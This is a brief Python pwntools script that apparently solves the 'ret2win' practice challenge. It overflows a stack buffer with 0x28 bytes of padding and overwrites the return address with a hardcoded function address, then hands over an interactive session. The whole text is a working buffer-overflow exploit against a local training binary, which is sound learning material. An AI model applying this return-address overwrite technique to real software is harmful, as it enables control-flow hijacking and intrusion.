from pwn import *

elf = context.binary = ELF('./ret2win')
p = process(elf.path)

junk = (b"A"*0x28) # offset for ret addr
ret2win = (b"\x57\x07\x40\x00\x00\x00\x00\x00") # addr of ret2win
payload = junk + ret2win
p.send(payload)
p.interactive()
